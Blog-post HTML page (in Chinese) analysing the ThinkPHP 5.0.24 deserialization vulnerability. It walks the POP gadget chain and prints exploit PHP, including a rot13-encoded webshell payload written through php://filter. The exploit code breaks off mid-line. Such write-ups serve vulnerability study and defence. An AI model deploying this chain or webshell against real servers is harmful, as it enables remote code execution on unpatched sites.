@@ -1,0 +1,912 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/favicon.ico?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.ico?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon.ico?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/favicon.ico?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="web 代码审计," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Da13's blog" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="前言最近发现自己代码审计的能力有所下滑，所以特别拿tp的各种漏洞出来分析一下。 此处用tp5.0.24版本的，后面还会有其他版本的。 分析首先5.0.24版本爆出来的是反序列化漏洞，那我就来分析一下反序列化的pop链的构造过程。 既然是反序列化，那么最重要的__destruct函数必然不可少。  这里有个windows.php，跟进一下  close函数没啥好看的，跟进removeFiles()">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Thinkphp5.0.24反序列化分析">
+<meta property="og:url" content="http://yoursite.com/2020/03/14/Thinkphp5.0.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/index.html">
+<meta property="og:site_name" content="Da13&#39;s blog">
+<meta property="og:description" content="前言最近发现自己代码审计的能力有所下滑，所以特别拿tp的各种漏洞出来分析一下。 此处用tp5.0.24版本的，后面还会有其他版本的。 分析首先5.0.24版本爆出来的是反序列化漏洞，那我就来分析一下反序列化的pop链的构造过程。 既然是反序列化，那么最重要的__destruct函数必然不可少。  这里有个windows.php，跟进一下  close函数没啥好看的，跟进removeFiles()">
+<meta property="og:image" content="https://note.youdao.com/yws/res/43168/WEBRESOURCEa3d65fd763bfdd7db296d83f61b47fc0">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/00831rSTgy1gcr0uhtpmoj30gw04k74s.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/00831rSTgy1gcr0whcyufj30ma08agmt.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/00831rSTgy1gcr2uyw6n7j30u00w1gt8.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/00831rSTgy1gcr2zad898j30v2042t9j.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/00831rSTgy1gcr3jh439aj30u00zu17n.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/00831rSTgy1gcr9m9g7yqj31mu0dm78c.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/00831rSTgy1gcrbaw8y16j30l20480t5.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/00831rSTgy1gcrbaftrbxj30kg04u3z0.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/00831rSTgy1gcrbjgk27fj30iq04wdg8.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/00831rSTgy1gcrclkuesmj31780h2jw9.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/00831rSTgy1gcrcs6i15yj30k603y74m.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/00831rSTgy1gcrj9pncr7j31520e2dj6.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/00831rSTgy1gcrjt0p7kej30xi042t9g.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/00831rSTgy1gcrjuxtqyoj30we04e753.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/00831rSTgy1gcrjxeb5qoj313a03wq3s.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/00831rSTgy1gcrk0jdf0hj31bq046755.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/00831rSTgy1gcrkb5r6uyj31580qk0yv.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/00831rSTgy1gcrkdyd04dj311u0hq77w.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/00831rSTgy1gcsjnvdlj1j30vg0e6gog.jpg">
+<meta property="og:image" content="https://p1.ssl.qhimg.com/t01811445c8ddbe04a2.png">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/00831rSTgy1gcsk37qxxfj319u09udhf.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/00831rSTgy1gcskdq06pdj31h20oywjo.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/00831rSTgy1gcskgtqpuoj30ic04aaaf.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/00831rSTgy1gcsku1r42yj30lo044jru.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/00831rSTgy1gcskvfv6zlj30j4048jrr.jpg">
+<meta property="og:image" content="http://note.youdao.com/yws/res/43425/WEBRESOURCE5f09c5fd23355ca9fe12c326fad8f09d">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/00831rSTgy1gcslhfokn2j31ba0a0abm.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/00831rSTgy1gcsljt07nij319e0ca0uu.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/00831rSTgy1gcsmbee1opj31hb0u0qqt.jpg">
+<meta property="article:published_time" content="2020-03-14T03:53:25.358Z">
+<meta property="article:modified_time" content="2020-03-14T04:15:55.262Z">
+<meta property="article:author" content="Da13">
+<meta property="article:tag" content="web 代码审计">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://note.youdao.com/yws/res/43168/WEBRESOURCEa3d65fd763bfdd7db296d83f61b47fc0">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2020/03/14/Thinkphp5.0.24反序列化分析/"/>
+
+
+
+
+
+  <title>Thinkphp5.0.24反序列化分析 | Da13's blog</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Da13's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/14/Thinkphp5.0.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Da13">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/123.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Da13's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Thinkphp5.0.24反序列化分析</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-03-14T11:53:25+08:00">
+                2020-03-14
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近发现自己代码审计的能力有所下滑，所以特别拿tp的各种漏洞出来分析一下。</p>
+<p>此处用tp5.0.24版本的，后面还会有其他版本的。</p>
+<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>首先5.0.24版本爆出来的是反序列化漏洞，那我就来分析一下反序列化的pop链的构造过程。</p>
+<p>既然是反序列化，那么最重要的__destruct函数必然不可少。</p>
+<p><img src="https://note.youdao.com/yws/res/43168/WEBRESOURCEa3d65fd763bfdd7db296d83f61b47fc0" alt="1.png"></p>
+<p>这里有个windows.php，跟进一下</p>
+<p><img src="https://tva1.sinaimg.cn/large/00831rSTgy1gcr0uhtpmoj30gw04k74s.jpg" alt=""></p>
+<p>close函数没啥好看的，跟进removeFiles()</p>
+<p><img src="https://tva1.sinaimg.cn/large/00831rSTgy1gcr0whcyufj30ma08agmt.jpg" alt=""></p>
+<p>我们知道这里file_exists方法是把后面的filename当作一个字符串处理，因而可能会触发tostring方法。</p>
+<p><img src="https://tva1.sinaimg.cn/large/00831rSTgy1gcr2uyw6n7j30u00w1gt8.jpg" alt=""></p>
+<p>这里我们重点think目录下的文件，因为think目录下的文件是tp的库文件。</p>
+<p>在collection和model文件的tostring下都有一个toJson方法，继续跟进。</p>
+<p><img src="https://tva1.sinaimg.cn/large/00831rSTgy1gcr2zad898j30v2042t9j.jpg" alt=""></p>
+<p>json_encode应该就是编码类的，不管。看看toArray()函数:</p>
+<p><img src="https://tva1.sinaimg.cn/large/00831rSTgy1gcr3jh439aj30u00zu17n.jpg" alt=""></p>
+<p>该函数里面用了很多方法，大部分是以this-&gt;指向的函数，这里勾出没有没有直接this指向的。</p>
+<p>可能你会觉得这四个是不是都要去去深入下去看看呢？我认为暂时没这个必要因为第一和第二个红框内都是把$name添加进$relation里面，最后还是会回到toArray()里面来。</p>
+<p>所以是没必要现在去深挖的。那么第三个红框需要深入吗？</p>
+<p>也是没必要的。因为第三和第四个红框是一起的，第三个红框里面的内容会影响第四个框里面的内容。所以这里我们选择最后一个作为调用__call的跳板。</p>
+<p>最后一个有两个参数一个是$value，一个是$attr。</p>
+<p>控制$value的核心代码就是901，902两行,$value受$modelRelation影响，$modelRelation受$relation影响，$relation又是$name控制的，也就是由$this-append控制的，这是我们可控的，这也就是说$modelRelation是Model类任意方法的返回值</p>
+<p>控制$attr的核心是在$modelRelation-&gt;getBindAttr()，$modelRelation恰好也是$name可控的。</p>
+<p>因此value和attr都是可控的，这里就有可能引用__call魔法函数</p>
+<p>接着我们深入getRelationData()看看是怎么解析的。</p>
+<p><img src="https://tva1.sinaimg.cn/large/00831rSTgy1gcr9m9g7yqj31mu0dm78c.jpg" alt=""></p>
+<p>这里可以看到有个if语句判断，我们跟进isSelfRelation()和getModel()。</p>
+<p><img src="https://tva1.sinaimg.cn/large/00831rSTgy1gcrbaw8y16j30l20480t5.jpg" alt=""><br><img src="https://tva1.sinaimg.cn/large/00831rSTgy1gcrbaftrbxj30kg04u3z0.jpg" alt=""><br><img src="https://tva1.sinaimg.cn/large/00831rSTgy1gcrbjgk27fj30iq04wdg8.jpg" alt=""></p>
+<p>这里可以看到isSelfRelation返回的是relation这个类，第一个getModel去请求了query类中的getModel方法，返回model变量值。get_class返回类的名称，也就是判断两个类是否一样。</p>
+<p>也就是让</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$item[$key] &#x3D; $value ? $value-&gt;getAttr($attr) : null;</span><br></pre></td></tr></table></figure>
+<p>中的$value等于model中的类才可以进入到这一步。</p>
+<p>接着对$attr变量进行分析。</p>
+<p><img src="https://tva1.sinaimg.cn/large/00831rSTgy1gcrclkuesmj31780h2jw9.jpg" alt=""></p>
+<p>这里有个getBindAttr函数，全局搜索一下，在OnetoOne.php里面找到了,并且OnetoOne类是relation类的子类。</p>
+<p><img src="https://tva1.sinaimg.cn/large/00831rSTgy1gcrcs6i15yj30k603y74m.jpg" alt=""></p>
+<p>这里bindAttr可以在反序列化的时候被我轻易伪造。</p>
+<p>因此总结一下前面说的，$this-&gt;$relation()的值进入$this-&gt;getRelationData()后有一个判断，只有当$value和上面简单可控的model变量同类并且控制$this-&gt;$relation()是0，才会进入循环得到$value。</p>
+<p>到这里就知道了可以进行反序列化了，接下来就是找可以反序列化的类了。这里肯定得靠__call方法的。并且因为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$item[$key] &#x3D; $value ? $value-&gt;getAttr($attr) : null;</span><br></pre></td></tr></table></figure>
+<p>所以__call方法最好在$value控制的类里面。</p>
+<p>我们全局找一下__call()。</p>
+<p>选择在Output类里面的__call()</p>
+<p><img src="https://tva1.sinaimg.cn/large/00831rSTgy1gcrj9pncr7j31520e2dj6.jpg" alt=""></p>
+<p>会调用call_user_func_array(‘block’,$args)</p>
+<p>跟进block函数：<br><img src="https://tva1.sinaimg.cn/large/00831rSTgy1gcrjt0p7kej30xi042t9g.jpg" alt=""></p>
+<p><img src="https://tva1.sinaimg.cn/large/00831rSTgy1gcrjuxtqyoj30we04e753.jpg" alt=""></p>
+<p><img src="https://tva1.sinaimg.cn/large/00831rSTgy1gcrjxeb5qoj313a03wq3s.jpg" alt=""></p>
+<p>所以最后执行的是$this-&gt;handler-&gt;write函数</p>
+<p>于是找找有没有write函数的类，在Memcached类中发现一个</p>
+<p><img src="https://tva1.sinaimg.cn/large/00831rSTgy1gcrk0jdf0hj31bq046755.jpg" alt=""></p>
+<p>再找调用set的方法,在/think/cache/driver/file.php里面发现了</p>
+<p><img src="https://tva1.sinaimg.cn/large/00831rSTgy1gcrkb5r6uyj31580qk0yv.jpg" alt=""></p>
+<p>有个file_put_contents写文件操作。跟进getCacheKey()</p>
+<p><img src="https://tva1.sinaimg.cn/large/00831rSTgy1gcrkdyd04dj311u0hq77w.jpg" alt=""></p>
+<p>这里filename = $this-&gt;options[‘path’]可控，但是写入文件的value是不可控的，因为根据前面参数的递进可知value是为true的。但是在后面setTagItem函数里面，我们又可以通过$name构造写入的内容。</p>
+<p><img src="https://tva1.sinaimg.cn/large/00831rSTgy1gcsjnvdlj1j30vg0e6gog.jpg" alt=""></p>
+<p>这里我们就可以构造name，然后还会进入一次set函数，把name当作valu写入文件。</p>
+<h1 id="POP构造"><a href="#POP构造" class="headerlink" title="POP构造"></a>POP构造</h1><p>这里先贴个安全客上面的一个图片，直观一点。</p>
+<p><img src="https://p1.ssl.qhimg.com/t01811445c8ddbe04a2.png" alt="image"></p>
+<p>这个pop链构造确实很烧脑，没办法本人代码能力太差，现在恶补一下。</p>
+<p>首先我们重新看回入口处，destruct函数。在window.php里面，并且有一个文件判断的条件触发__tostring，所以我们需要伪造$file。<br><img src="https://tva1.sinaimg.cn/large/00831rSTgy1gcsk37qxxfj319u09udhf.jpg" alt=""></p>
+<p>触发后，进入Model抽象类的__tostring()，一直到toArray()。</p>
+<p>接着toArray里的$this.append我们可以伪造，进而伪造$name,$value</p>
+<p><img src="https://tva1.sinaimg.cn/large/00831rSTgy1gcskdq06pdj31h20oywjo.jpg" alt=""></p>
+<p>这里我们伪造的append，也就是name是getError这个函数，因为这个函数可控。</p>
+<p><img src="https://tva1.sinaimg.cn/large/00831rSTgy1gcskgtqpuoj30ic04aaaf.jpg" alt=""></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$modelRelation &#x3D; $this-&gt;$relation();</span><br><span class="line">$value &#x3D; $this-&gt;getRelationData($modelRelation);</span><br></pre></td></tr></table></figure>
+
+<p>使value能够被我们任意构造，我代码里面的$modeRelation就是error的值，我们赋予它的值，也就是我们赋予$value的地方，至于它是多少，以及parent是什么接下来会分析到。</p>
+<p>跟进getRelationData函数，$modelRelation形参就是我们构造的值，对应$this-&gt;error的值</p>
+<p>isSelfRelation函数是Relation抽象函数的一个方法，我们要控制它为0，但是抽象函数是不能实例化的，所以我们得找Relation的一个子类，但是不慌，我们先接着分析。</p>
+<p>getModel()方法也是Relation抽象函数里面，<br><img src="https://tva1.sinaimg.cn/large/00831rSTgy1gcsku1r42yj30lo044jru.jpg" alt=""></p>
+<p>这里query其实就是Query类</p>
+<p><img src="https://tva1.sinaimg.cn/large/00831rSTgy1gcskvfv6zlj30j4048jrr.jpg" alt=""></p>
+<p>这里可以看到Query类中的model也是可以控制的。所以倒推回去，</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$modelRelation-&gt;getModel()</span><br></pre></td></tr></table></figure>
+
+<p>这个地方我们就可以控制Query中的model变量来控制它的值，只要parent类的值和我们构造的model的值相等就可以为真了。</p>
+<p><img src="http://note.youdao.com/yws/res/43425/WEBRESOURCE5f09c5fd23355ca9fe12c326fad8f09d" alt="image.png"></p>
+<p>那么这里的$modelRelation为什么要是HasOne呢？</p>
+<p>因为在toArray函数中，有这么一个判断</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if (method_exists($modelRelation, &#39;getBindAttr&#39;))</span><br></pre></td></tr></table></figure>
+
+<p>我们构造的modelRelation要有getBindAttr这个函数，我们全局查找一下，一个OnetoOne的抽象类有这个方法，（也是Relation的子类）。因此我们只要找OnetoOne的子类就可以了，全局查找了一下，就有一个HasOne符合这些条件。</p>
+<p>所以我们这里让$modelRelation为HasOne,然后$this-&gt;parent就可以构造成output类，为了后面的__call的引用。</p>
+<p>至于这里为什么有个Pivot，也是因为Model是抽象类，需要找个子类来继承他的方法。</p>
+<p>所以我们能很顺利的调用Output中的__call方法了。</p>
+<p>进了该方法后，我们得先伪造一个getAttr是在$this-&gt;styles里面的，才能触发block函数。</p>
+<p>对block函数步步深入，会到这么一个方法</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$this-&gt;handle-&gt;write($messages, $newline, $type);</span><br></pre></td></tr></table></figure>
+<p>这里handle我们也是可以控制的，让handle等于think\session\driver\Memcached类就可以跳过去了。</p>
+<p><img src="https://tva1.sinaimg.cn/large/00831rSTgy1gcslhfokn2j31ba0a0abm.jpg" alt=""></p>
+<p>因为Memcached中的write方法也是受到$this-&gt;handler控制的，我们又可以利用这个做跳板，跳到File类</p>
+<p><img src="https://tva1.sinaimg.cn/large/00831rSTgy1gcsljt07nij319e0ca0uu.jpg" alt=""></p>
+<p>最后再构造一下参数就可以写文件操作了。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">namespace think\cache\driver &#123;</span><br><span class="line">    class File</span><br><span class="line">    &#123;</span><br><span class="line">        protected $options&#x3D;null;</span><br><span class="line">        protected $tag;</span><br><span class="line"></span><br><span class="line">        function __construct()&#123;</span><br><span class="line">            $this-&gt;options&#x3D;[&#39;expire&#39; &#x3D;&gt; 3600, &#39;cache_subdir&#39; &#x3D;&gt; false, &#39;prefix&#39; &#x3D;&gt; &#39;&#39;, &#39;path&#39; &#x3D;&gt; &#39;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;string.rot13&#x2F;resource&#x3D;.&#x2F;&lt;?cuc cucvasb();riny($_TRG[pzq]);?&gt;&#39;, &#39;data_compress&#39; &#x3D;&gt; false,];</span><br><span class="line">            $this-&gt;tag &#x3D; &#39;123&#39;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>最后用倒叙的方法一步步往上面包含就可以得到最后的exp了。</p>
+<h1 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace think\process\pipes &#123;</span><br><span class="line">    class Windows &#123;</span><br><span class="line">        private $files &#x3D; [];</span><br><span class="line"></span><br><span class="line">        public function __construct($files)</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;files &#x3D; [$files];            &#x2F;&#x2F;$file &#x3D;&gt; &#x2F;think&#x2F;Model的子类new Pivot(); Model是抽象类</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace think &#123;</span><br><span class="line">    abstract class Model&#123;</span><br><span class="line">        protected $append &#x3D; [];</span><br><span class="line"></span><br><span class="line">        protected $error &#x3D; null;</span><br><span class="line">        protected $parent;</span><br><span class="line"></span><br><span class="line">        function __construct($output, $modelRelation)</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;parent &#x3D; $output;                     &#x2F;&#x2F;$this-&gt;parent&#x3D;&gt; think\console\Output;</span><br><span class="line"></span><br><span class="line">            $this-&gt;append &#x3D; array(&quot;test&quot;&#x3D;&gt;&quot;getError&quot;);     &#x2F;&#x2F;调用getError 返回this-&gt;error</span><br><span class="line">            $this-&gt;error &#x3D; $modelRelation;               &#x2F;&#x2F; $this-&gt;error 要为 relation类的子类，并且也是OnetoOne类的子类&#x3D;&#x3D;&gt;&gt;HasOne</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace think\model&#123;</span><br><span class="line">    use think\Model;</span><br><span class="line">    class Pivot extends Model&#123;</span><br><span class="line">        function __construct($output, $modelRelation)</span><br><span class="line">        &#123;</span><br><span class="line">            parent::__construct($output, $modelRelation);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace think\model\relation&#123;</span><br><span class="line">    class HasOne extends OneToOne &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace think\model\relation &#123;</span><br><span class="line">    abstract class OneToOne</span><br><span class="line">    &#123;</span><br><span class="line">        protected $selfRelation;</span><br><span class="line">        protected $bindAttr &#x3D; [];</span><br><span class="line">        protected $query;</span><br><span class="line">        function __construct($query)</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;selfRelation &#x3D; 0;</span><br><span class="line">            $this-&gt;query &#x3D; $query;                             &#x2F;&#x2F;$query指向Query</span><br><span class="line">            $this-&gt;bindAttr &#x3D; [&#39;test&#39;];                       &#x2F;&#x2F; $value值，作为call函数引用的第二变量</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace think\db &#123;</span><br><span class="line">    class Query &#123;</span><br><span class="line">        protected $model;</span><br><span class="line"></span><br><span class="line">        function __construct($model)</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;model &#x3D; $model;                       &#x2F;&#x2F;$this-&gt;model&#x3D;&gt; think\console\Output;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace think\console&#123;</span><br><span class="line">    class Output&#123;</span><br><span class="line">        function __construct($handle)</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;styles &#x3D; [&#39;getAttr&#39;];</span><br><span class="line">            $this-&gt;handle &#x3D;$handle;                       &#x2F;&#x2F;$handle-&gt;think\session\driver\Memcached</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace think\session\driver &#123;</span><br><span class="line">    class Memcached</span><br><span class="line">    &#123;</span><br><span class="line">        protected $handler &#x3D; null;</span><br><span class="line"></span><br><span class="line">        function __construct($handle)</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;handler &#x3D; $handle;                       &#x2F;&#x2F;$handle-&gt;think\cache\driver\File</span><br><span class="line">            $this-&gt;config &#x3D; 